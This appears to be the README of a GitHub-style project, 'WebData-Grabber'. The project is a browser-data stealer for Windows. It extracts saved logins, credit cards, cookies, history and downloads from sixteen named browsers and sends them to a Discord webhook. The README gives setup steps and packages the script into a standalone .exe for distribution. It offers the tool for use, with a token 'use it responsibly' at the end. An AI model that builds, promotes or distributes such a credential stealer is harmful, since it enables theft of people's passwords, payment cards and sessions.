# WebData-Grabber
WebData-Grabber is a tool designed to extract web browser data on Windows systems and send it as notifications to a Discord server. This tool can capture a variety of data, including login credentials, browsing history, and more.

# Browser Data Extractor

This script extracts various types of data from web browsers installed on a Windows system and sends the collected data to a Discord webhook.

## Usage

1. Clone or download this repository to your local machine.

2. Install the required Python packages using the `requirements.txt` file.
   ```shell
   pip install -r requirements.txt

3. Configure the WEBHOOK_URL variable in the main.py script with your Discord webhook URL.

## Create an Executable File

For distribute the script as an executable `(.exe)` follow these steps:
   
   - Open a terminal in the directory where you have the main.py file.
     
   - Install pyinstaller if you haven't already:
     ```shell
     pip install pyinstaller
     
   - Create the executable file:
     ```shell
     pyinstaller --onefile main.py

   - This will generate a dist folder containing the main.exe executable.

   - The script will extract data from supported web browsers and send it to the configured Discord webhook.

## Supported Browsers

The script supports the following browsers:

- AMIGO
- TORCH
- KOMETA
- ORBITUM
- CENT BROWSER
- 7STAR
- SPUTNIK
- VIVALDI
- GOOGLE CHROME SXS
- GOOGLE CHROME
- EPIC PRIVACY BROWSER
- MICROSOFT EDGE
- URAN
- YANDEX
- BRAVE
- IRIDIUM

## Supported Data 

The script can extract the following types of data:

- Login Data
- Credit Cards
- Cookies
- History
- Downloads

## Note

This script is provided as-is and may not work with future browser updates or changes, use it responsibly.

## 

The script was made by Exlerd, enjoy! :D

`Discord: exlerd`
